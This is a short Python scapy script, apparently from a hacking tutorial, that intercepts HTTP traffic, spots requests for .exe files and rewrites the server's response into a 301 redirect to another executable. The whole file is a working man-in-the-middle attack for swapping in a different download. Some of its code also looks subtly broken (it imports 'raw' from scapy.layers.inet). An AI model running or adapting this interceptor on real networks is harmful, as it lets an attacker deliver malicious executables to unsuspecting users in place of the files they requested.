from scapy.all import *
from scapy.layers.inet import IP, TCP, raw  # Fixed import issue with 'Raw'

# List to track acknowledged packets
ack_list = []


def process_packet(packet):
    scapy_packet = IP(packet)

    # Check if it's HTTP traffic (port 80)
    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(raw):
        # If it's a request (destination port 80)
        if scapy_packet[TCP].dport == 80:
            # Check if the request contains '.exe'
            if b".exe" in scapy_packet[raw].load:
                print("[+] EXE Request detected")
                # Track the acknowledgment number
                ack_list.append(scapy_packet[TCP].ack)

        # If it's a response (source port 80)
        elif scapy_packet[TCP].sport == 80:
            # Check if the acknowledgment number is in our list
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing the file download with a redirect")

                # Replace the payload with an HTTP redirect to a different file
                scapy_packet[
                    raw].load = b"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar560.exe\n\n"

                # Recalculate the length and checksum fields
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                # Send the modified packet
                send(scapy_packet)
                return

    # If no modification is needed, just forward the packet
    send(scapy_packet)


def start_sniffing(interface):
    print(f"[*] Starting HTTP file interceptor on interface {interface}")
    sniff(iface=interface, prn=process_packet, filter="tcp port 80", store=False)


if __name__ == "__main__":
    # Set your network interface (you can replace 'en0' with your actual interface)
    interface = "en0"
    start_sniffing(interface)
